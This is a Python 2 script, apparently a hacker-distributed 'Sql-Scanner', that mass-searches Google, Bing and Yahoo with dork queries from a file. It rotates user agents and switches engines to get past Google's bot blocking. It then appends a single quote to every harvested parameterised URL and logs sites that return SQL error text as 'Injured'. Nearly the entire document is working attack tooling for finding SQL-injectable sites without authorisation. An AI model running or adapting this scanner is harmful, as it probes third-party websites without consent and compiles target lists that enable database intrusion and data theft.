#!/usr/bin/python2
#coding=utf-8
#created by ahmed al nassif

import os,sys,time,random,urllib2,webbrowser,cookielib
from datetime import datetime
from os.path import exists
try:
	import mechanize
except ImportError:
	print '\033[1;34m[*] \033[1;33mInstalling Mechanize\033[0m'
	os.system('python2 -m pip install mechanize')
try:
	import requests
except ImportError:
	print '\033[1;34m[*] \033[1;33m Installing Requests\033[0m'
	os.system('python2 -m pip install requests')
try:
	import bs4
except ImportError:
	print '\033[1;34m[*] \033[1;33mInstalling BS4\033[0m'
	os.system('python2 -m pip install bs4')
import mechanize,requests,bs4
from mechanize import Browser
from bs4 import BeautifulSoup
html=BeautifulSoup
def user_agent():
	useragents=open('useragent','r')
	useragent=list(useragents)
	uagent=random.choice(useragent)
	ua=uagent.replace('\n','')
	return ua

def cookies(cookie1):
	try:
		soup=html(str(cookie1),"html.parser")
		cookies=list(soup.find_all('cookie'))
		cookies=cookies[-1]
		cookies=str(cookies).replace('cookie','')
		cookies=cookies.replace('</','')
		cookies=cookies.replace('<','')
		cookies=cookies.replace('>','')
		cookies=cookies.replace(']','')
		cookies=cookies.replace('[','')
	except:
		cookies=None
	return cookies

def logo():
	logo=(
"""\033[1;32m
┌────────────────────────────────────────┐
\033[1;32m│ \033[1;32mTool Sql-Scanner                       │
\033[1;32m│ \033[1;34mCreated by Ahmed Al Nassif             \033[1;32m│
\033[1;32m│ \033[1;34mFacebook\033[1;31m:\033[1;37m Ahmed Ahmed|100049582051187  \033[1;32m│
\033[1;32m│ \033[1;35mWebsite\033[1;31m: \033[1;36m\033[4manhhacker.blogspot.com\033[0m        \033[1;32m│
\033[1;32m│ \033[1;30mGitHub\033[1;31m:\033[1;37m \033[4mhttps://github.com/as9697347\033[0m   \033[1;32m│
\033[1;32m│ \033[1;35mVersion\033[1;31m:\033[1;37m \033[4m1.0\033[0m                           \033[1;32m│
\033[1;32m└────────────────────────────────────────┘""")
	print logo

def openlink():
	if exists('/data/data/com.termux/files/usr/bin/termux-open'):
		os.system('termux-open http://anhhacker.blogspot.com')
	elif exists('/data/data/com.termux/files/usr/bin/termux-open-url'):
		os.system('termux-open-url http://anhhacker.blogspot.com')
	elif exists('!/usr/bin/xdg-open'):
		os.system('xdg-open http://anhhacker.blogspot.com')
	else:
		webbrowser.open('http://anhhacker.blogspot.com')

def done():
	print '\033[1;34m[\033[1;31m*\033[1;34m] \033[1;37m Websites not Injured ',len(injured)
	for i in injured:
		print '\033[1;34m[\033[1;31m*\033[1;34m] \033[1;31mnot Injured \033[1;35mlink: \033[1;32m',i,'\033[0m'
	print '\033[1;34m[\033[1;32m+\033[1;34m] \033[1;37m Websites Injured ',len(suss)
	for i in suss:
		print '\033[1;34m[\033[1;32m+\033[1;34m] \033[1;32mInjured \033[1;35mlink: \033[1;32m',i,'\033[0m'
	print '\033[1;34m[\033[1;32m^\033[1;34m] \033[1;33mDone scan websites Injured ',len(suss),'\033[0m'
	openlink()
br = Browser()
br.set_handle_robots(False)
cookiejar =cookielib.LWPCookieJar()
br.set_cookiejar(cookiejar)
cookie = cookielib.Cookie(version=0, name='PON', value="xxx.xxx.xxx.111", expires=365, port=None, port_specified=False, domain='xxxx', domain_specified=True, domain_initial_dot=False, path='/', path_specified=True, secure=True, discard=False, comment=None, comment_url=None, rest={'HttpOnly': False}, rfc2109=False)
cookiejar.set_cookie(cookie)

#databases
database=[]
urls=[]
suss=[]
injured=[]
log_old=[]

try:
	open('.cache')
	st=raw_input('\033[1;34m[*] \033[1;37mStart in terms of stop [Y|n]: \033[1;36m')
	if st=='y' or st=='Y':
		sqls=open('.cache','r')
		sqls=list(sqls)
		os.system('rm .cache')
	else:
		sqls=open('sql.txt','r')
		sqls=list(sqls)
		random.shuffle(sqls)
except:
	sqls=open('sql.txt','r')
	sqls=list(sqls)
	random.shuffle(sqls)
timer='\033[1;37m[\033[0m\033[32m'+str(datetime.now().strftime("%H:%M:%S"))+'\033[1;37m] '
block=["Our systems have detected unusual traffic from your computer network.  This page checks to see if it&#39;s really you sending the requests, and not a robot", "This page appears when Google automatically detects requests coming from your computer network which appear to be in violation of the", "The block will expire shortly after those requests stop"]
def start():
	search=''
	blocked=''
	c=0
	b=0
	try:
		log=open('log.txt','r')
		for l in log:
			l=l.replace('\n','')
			log_old.append(l)
	except:
		pass
	os.system('clear')
	logo()
	print '\033[1;34m[\033[1;37m>\033[1;34m]\033[1;33m Search Engine'
	print '\033[1;34m[\033[1;33m1\033[1;34m] \033[1;37mGoogle'
	print '\033[1;34m[\033[1;33m2\033[1;34m] \033[1;37mBing'
	print '\033[1;34m[\033[1;33m3\033[1;34m] \033[1;37mYahoo'
	opt=raw_input('\033[1;34m[\033[1;37m^\033[1;34m] \033[1;35mSelect options: \033[1;37m')
	for sql in sqls:
		c+=1
		sql=sql.replace('\n','')
		br.addheaders=[('User-Agent',user_agent())]
		if blocked:
			if b>=10:
				print timer+'\033[1;34m[\033[1;32m+\033[1;34m] \033[1;33mTry agent in Google\033[0m'
				req=requests.get(url,headers={'User-Agent' : user_agent()})
				if block[0] not in req.text or block[1] not in req.text or block[2] not in req.text:
					print timer+'\033[1;34m[\033[1;32m+\033[1;34m] \033[1;33mGoogle unblock you\033[0m'
					option=raw_input(timer+'\033[1;34m[\033[1;32m+\033[1;34m]\033[1;37m Move to Google [Y|n]: \033[1;36m')
					if option=='y' or option=='Y':
						opt='1'
					else:
						blocked=''
				b=0
			b+=1
		if opt=='1':
			url=("https://google.com/search?q="+sql)
		elif opt=='2':
			url=("http://www.bing.com/search?q="+sql)
		elif opt=='3':
			url=("https://uk.search.yahoo.com/search?p="+sql)
		else:
			print '\033[1;31m[✘] Error in input\033[0m'
			time.sleep(3)
			start()
		print timer+'\033[1;34m[\033[1;37m'+str(c)+'\033[1;34m]\033[1;37m Start search sql \033[1;31m:\033[1;36m',sql,'\033[0m'
		print timer+'\033[1;34m[*]\033[1;33m Cookie\033[1;31m:\033[1;37m',cookies(cookiejar),'\033[0m'
		if 'google' in url:
			time.sleep(1)
		try:
			try:
				w=br.open(url)
				links = br.links()
			except:
				headers={'User-Agent' : user_agent()}
				req=requests.get(url,headers)
				if block[0] in req.text or block[1] in req.text or block[2] in req.text:
					print timer+'\033[1;34m[\033[1;31m!\033[1;34m] \033[1;33mGoogle Blocked you\033[0m'
					print timer+'\033[1;34m[\033[1;32m+\033[1;34m]\033[1;37m Move to Bing\033[0m'
					opt='2'
					blocked=url
				else:
					soup=html(req.text,'html.parser')
					links=soup.find_all('a',href=True)
		except (urllib2.URLError,mechanize.URLError,requests.exceptions.ConnectionError):
			print"\033[1;91m[✘] No connection\033[0m"
			file=open('.cache','w')
			file.writelines(sqls[c-1:])
			file.close()
			openlink()
			exit()
		for link in links:
			try:
				link=link['href']
			except:
				link=link.url
			if not link in urls:
				if '/url?q=' in link:
					link=link.replace('/url?q=','')
				if 'http' in link or 'www' in link:
					print timer+'\033[1;34m[\033[1;37m=\033[1;34m]\033[1;33m Link \033[0m\033[32m: \033[1;37m',link,'\033[0m'
				urls.append(link)
				time.sleep(.2)
				if '?id=' in link or '?num=' in link or '?file=' in link or '?cat=' in link or '?ID=' in link:
					print timer+'\033[1;34m[*] \033[1;35mScan link: \033[1;36m',link,'\033[0m'
					time.sleep(.2)
					database.append(link)
		print '\033[1;34m[*]\033[1;33m Start scan links \033[1;32m',len(database),'\033[0m'
		for link in database:
			if 'http' not in link and 'www.' in link:
				link='http://'+link
			if link[:4]=='http' or link[:5]=='https':
				try:
					data=requests.get(link+"'",headers={'User-Agent' : user_agent()})
					if 'sql' in data.text or 'SQL' in data.text or 'MySQL' in data.text:
						suss.append(link)
						print '\033[1;34m[\033[1;32m'+str(len(suss))+'\033[1;34m] \033[1;32mInjured \033[1;35mlink: \033[1;32m',link,'\033[0m'
						if not link in log_old:
							file=open('log.txt','a')
							file.write(link+'\n')
							file.close()
							time.sleep(.2)
					else:
						injured.append(link)
						print '\033[1;34m[\033[1;31m'+str(len(injured))+'\033[1;34m] \033[1;31mnot Injured \033[1;35mlink: \033[1;33m',link,'\033[0m'
						time.sleep(.2)
				except:
					pass
			database.remove(link)
	done()

if __name__ == '__main__':
	try:
		start()
	except KeyboardInterrupt:
		done()